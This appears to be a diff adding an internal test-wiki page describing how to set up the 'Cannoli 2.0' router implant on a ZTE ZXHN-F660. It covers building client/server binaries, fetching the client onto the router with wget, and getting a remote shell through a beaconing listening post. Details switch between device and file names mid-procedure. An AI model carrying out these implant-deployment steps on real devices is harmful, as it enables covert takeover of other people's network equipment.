@@ -1,0 +1,53 @@
+
+                        Owner: User #1179928
+JQJCALIBAR - ZXHN-F660
+Setup / Test ZTE ZXHN-F660 with ARM5 LE configured Cannoli 2.0 (2/24 - )
+
+Connect ZTE ZXHN LANLocal Area Network side to VLANVirtual Local Area Network 611 for Cannoli LANLocal Area Network side (DHCPDynamic Host Configuration Protocol from DUTDevice Under Test 192.168.1.0/24 / GW = .1)Cannoli-lan-1 VMVirtual Machine should obtain a 192.168.1.0/24 IP address from the F660
+
+
+On Cannoli LP/LAN side machine (same VMVirtual Machine):
+Unzipped Cannoli 2.0 zip in: /home/ndb/calibar/cannoli_v2.0.0/
+In /bin/ folder, copied the .cfg example file and make a calibar.cfg file with the LPListening Post IP as the #1 LPListening Post (172.20.13.49)
+Run the following command to create client & server files: 
+./CCT ../bin/arm5-32-LE-static/client/client calibar-client ../bin/arm5-32-LE-static/server/server calibar-server calibar.cfg
+Place the configured Cannoli client binary and the dns.sh script into a directory served via HTTPHypertext Transfer Protocol from the LAN-side machine.
+Using a web browser, log in to the web administration page on the router. (This initiates a session, which is required for the following steps to work.)
+
+
+
+
+
+On LANLocal Area Network VMWith the LANLocal Area Network side computer setup with HTTPHypertext Transfer Protocol access and the calibar-client file on the WWW root folder (/var/www), run the following command to upload the calibar-client file to the ZXHN-F660
+wget ftp://192.168.1.4/prize-client
+Once prize-client has uploaded, change the permissions#chmod 755 prize-client
+
+With LPListening Post listening (directions below) start the prize-client on the AC68U/tmp# ./prize-client -b &
+
+
+
+
+
+From Cannoli LPListening Post window:
+
+With the "./calibar-server 9000" already running on the LP... implant beacons back with it's source IP of 172.20.100.254
+Beacon was originally set to beacon every 60 seconds
+Modify shell.sh example script to set taget_mac to WANWide Area Network mac address (Impant ID) of ASUS
+Issued "./shell.sh" command after this to get a shell once the target beacons back again.
+type "ls" at new shell prompt and the file system on target is seen
+native shell commands are available
+
+
+
+
+
+More test notes located on 10.9.8.21/Share/Testing/JQJPRIZE/QRC_2016_01_29
+
+
+
+Previous versions:
+| 1 empty
+| 2 
+| 3 
+|
+                    
